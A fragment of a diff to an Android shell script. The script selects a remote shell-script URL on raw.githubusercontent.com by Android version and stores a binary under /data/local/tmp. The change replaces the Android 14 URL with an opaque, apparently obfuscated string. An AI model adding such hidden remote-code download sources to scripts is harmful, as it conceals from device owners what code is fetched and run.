@@ -21,7 +21,8 @@ responsebin="/data/local/tmp/gtrx64"
 architecture=$(getprop ro.product.cpu.abi)
 android_version=$(getprop ro.build.version.release)
 if [[ $android_version == 14* ]]; then
-    url="https://raw.githubusercontent.com/HenBz10Real/snx11response/main/bin/gatrox.sh"
+    url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
+t2LmsNWgsz9zrN4mQ2W0td94CeEf"
 elif [[ $android_version == 13* ]]; then
     url="https://raw.githubusercontent.com/HenBz10Real/snx11response/main/bin/gatrox.sh"
 elif [[ $android_version == 12* ]]; then
